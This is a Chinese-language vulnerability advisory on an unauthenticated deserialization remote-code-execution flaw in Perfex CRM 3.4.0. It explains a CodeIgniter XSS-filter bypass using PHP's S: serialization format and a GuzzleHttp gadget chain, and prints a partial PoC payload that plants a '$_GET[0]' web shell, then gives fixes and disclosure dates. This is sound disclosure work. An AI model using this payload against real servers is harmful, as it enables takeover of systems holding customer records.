#  Perfex CRM 高危漏洞分析：未授权反序列化导致远程代码执行  
 幻泉之洲   2026-03-18 01:38  
  
> 研究人员在Perfex CRM v3.4.0及更早版本中发现一个关键的远程代码执行漏洞。由于对用户控制的‘autologin’会话凭证直接进行不安全的反序列化操作，攻击者可以通过精心构造的序列化payload，利用预装的GuzzleHttp库中的FileCookieJar组件，无需任何身份验证即可在服务器上执行任意代码。漏洞利用链条复杂，绕过了CodeIgniter框架的XSS过滤，并使用几乎被遗忘的PHP序列化S:格式转义特性。  
  
## 漏洞概述  
  
**威胁等级：**  
高危到严重（CVSS 4.0评分为满分10.0）。  
  
**CWE：**  
 CWE-502 - 反序列化不受信任的数据。  
  
**受影响产品：**  
 由MSTdev开发的Perfex CRM。  
  
**受影响版本：**  
 v3.4.0及所有更早版本。  
  
**披露日期：**  
2026年3月16日。  
> 已有证据表明此漏洞在漏洞披露前已被攻击者在野利用。Perfex CRM存储客户记录、发票、合同和个人数据，其小型企业用户几乎没有安全防护能力。  
  
## 漏洞技术原理分析  
### 1. 漏洞根源  
  
漏洞的核心位于Perfex CRM的认证模块。在 models/Authentication_model.php  
 文件的 autologin()  
 方法中，应用直接将从cookie获取的‘autologin’值传递给了PHP的 unserialize()  
 函数，且没有任何验证。  
  
public function autologin()  
  
{  
  
    if (!is_logged_in()) {  
  
        $this->load->helper('cookie');  
  
        if ($cookie = get_cookie('autologin', true)) {  
**$data = unserialize($cookie);**  
  
            if (isset($data['key']) and isset($data['user_id'])) {  
  
这导致了典型的PHP对象注入。每次请求、每个路由都会执行这个反序列化操作。  
### 2. 绕过的艺术：XSS过滤器与S:格式  
  
直接利用的第一个障碍是CodeIgniter的XSS过滤器。当 get_cookie('autologin', true)  
 的第二个参数设为true时，会启用过滤。  
  
该过滤器会移除不可见字符，包括NULL字节（\x00  
）。然而，PHP序列化后的**私有属性**  
的键名格式为\x00ClassName\x00property  
，其中的NULL字节是结构性的。过滤器会破坏这个结构。  
  
解决方案利用了PHP反序列化器中一个鲜为人知且已被弃用的特性：**大写S:格式**  
。  
- 标准的字符串格式：s:17:"\x00ClassName\x00prop"  
  
- S:格式：S:17:"\00ClassName\00prop"  
（用可打印的ASCII\xx  
表示十六进制转义）  
  
大写 S:  
 标签会让反序列化器在解析时，将 \xx  
 这样的十六进制转义序列转换为对应的字节。这个格式最初是为PHP 5和已废弃的PHP 6之间的兼容性而添加的，自2006年存在以来，几乎没有被正式使用过，直到PHP 8.4才被弃用。由于payload在通过过滤器时全是可打印字符，不会触发字符移除，随后在 unserialize()  
 内部，\00  
 会被正确还原为NULL字节。  
### 3. 其他障碍与解决  
  
构建完整的利用链还克服了另外三个问题：  
1. **反斜杠转义：**  
 涉及命名空间的私有属性名需要反斜杠。S:格式将每个\  
都视为转义开始，所以需要用 \5c  
 来表示字面意义上的反斜杠。例如：S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies"  
。  
  
1. **PHP标签过滤：**  
 CodeIgniter的 xss_clean()  
 会替换PHP开始/结束标签（<?  
，?>  
）。通过在S:格式字符串中使用十六进制编码来绕过，例如：\3c\3f  
 解码为 <?  
。  
  
1. **类型错误：**  
 反序列化后，代码检查 isset($data['key'])  
。如果$data  
是一个对象而非数组，PHP 8会抛出TypeError。解决方案是将整个恶意对象包裹在一个包含有效key  
和user_id  
的数组中。  
  
### 4. 完整的攻击链  
  
利用预装的GuzzleHttp库中的**FileCookieJar**  
类。其 __destruct()  
 析构函数会调用 save($this->filename)  
，最终执行 file_put_contents($filename, $content)  
。  
  
通过精心构造一个 SetCookie  
 对象的“Name”字段，并将其设置为一个PHP短标签（如 <?=`$_GET[0]`?>  
），当这个对象被写入文件后，该文件被访问时就会执行其中的PHP代码。  
  
完整的Payload结构是一个嵌套的数组和对象组合，巧妙地满足了所有条件并触发析构函数中的文件写入操作。  
## 影响范围  
  
此漏洞影响的组件非常核心：  
- **受影响的组件：**core/App_Controller.php  
 和 models/Authentication_model.php  
 中处理自动登录的逻辑。  
  
- **利用前提：**  
 无。攻击者无需认证，只需要能向目标服务器发送一个携带恶意“autologin” cookie的HTTP请求。  
  
- **影响程度：**  
 攻击者可获得Web服务器用户的权限，在目标系统上执行任意命令，完全控制系统。  
  
## PoC 概念验证  
  
以下是构造的恶意序列化数据（PoC）的核心结构摘要。实际利用时需要发送一个名为“autologin”的cookie，其值为以下经过URL编码的数据：  
  
a:3:{  
  
  s:3:"key";s:1:"x";  
  
  s:7:"user_id";s:1:"1";  
  
  s:3:"jar";  
  
  O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{  
  
    S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies";  
  
    a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{  
  
      S:33:"\00GuzzleHttp\5cCookie\5cSetCookie\00data";  
  
      a:9:{  
  
        s:4:"Name";  
  
        S:15:"\3c\3f=\60$_GET[0]\60\3f\3e"; // <?=`$_GET[0]`?>  
  
        s:5:"Value";s:1:"x";  
  
        s:6:"Domain";s:9:"localhost";  
  
        ... // 其他必要的cookie属性  
  
      }  
  
    }}  
  
    S:41:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00filename";  
  
    s:31:"filename.php"; // 要写入的Web可访问路径  
  
    ... // 其他属性设置  
  
  }  
  
}  
  
成功后，攻击者可以通过访问写入的文件（如 http://target/filename.php?0=whoami  
）来执行系统命令。  
## 修复建议与缓解措施  
### 官方修复方案  
  
Perfex CRM已在 **v3.4.1 安全维护版本**  
中修复此漏洞。修复措施包括：  
1. **替换序列化方法：**  
 将 serialize()  
/unserialize()  
 替换为 json_encode()  
/json_decode()  
。JSON格式无法实例化PHP对象，从根本上消除了对象注入的可能性。  
$data = json_decode($cookie, true); // 替换了 unserialize($cookie)  
  
1. **增加类型校验：**  
 在解码后，严格检查数据类型（is_array()  
, is_numeric()  
, is_string()  
）。  
  
1. **强化令牌生成：**  
 自动登录密钥改为使用 bin2hex(random_bytes(32))  
 生成，并以哈希（hash('sha256', $key)  
）形式存储。  
  
**因此，最直接有效的措施是立即升级到Perfex CRM v3.4.1或更高版本。**  
### 临时缓解措施  
  
对于无法立即升级的用户，可以考虑：  
- **禁用自动登录功能**  
（如果业务允许）。  
  
- 在Web应用防火墙（WAF）或服务器层面，添加规则以拦截或过滤cookie中包含疑似PHP序列化字符串（如开头为"a:"、"O:"、"S:"等）的请求。但这种方法并非万无一失。  
  
> 鉴于漏洞已被在野利用，强烈建议所有受影响用户立即检查服务器是否存在后门文件，并假设系统可能已遭入侵。安全的做法是从干净的安装开始，并重置Perfex CRM内的所有密钥和密码。  
  
## 披露历程时间线  
<table><thead><tr><th><section><span leaf="">日期</span></section></th><th><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td><section><span leaf="">2026-01-05</span></section></td><td><section><span leaf="">向供应商初次报告。</span></section></td></tr><tr><td><section><span leaf="">2026-01-08</span></section></td><td><section><span leaf="">向供应商分享技术细节。</span></section></td></tr><tr><td><section><span leaf="">2026-02-02</span></section></td><td><section><span leaf="">因响应迟缓，将问题升级至平台方Envato。</span></section></td></tr><tr><td><section><span leaf="">2026-02-18</span></section></td><td><section><span leaf="">供应商回复并提供了首个补丁，经反馈后提供了修正版本。</span></section></td></tr><tr><td><section><span leaf="">2026-03-13</span></section></td><td><section><span leaf="">供应商发布安全修复版本v3.4.1。</span></section></td></tr><tr><td><section><span leaf="">2026-03-16</span></section></td><td><section><span leaf="">完整技术细节公开披露。</span></section></td></tr></tbody></table>  
从报告到修复总共历时67天，其中44天沟通处于停滞状态。  
  
漏洞的根本原因再次印证了信息安全中的古老格言：永远不要反序列化来自不受信任来源的数据。对于开发者而言，应优先选择JSON等安全的、不涉及代码执行的数据交换格式。  
  
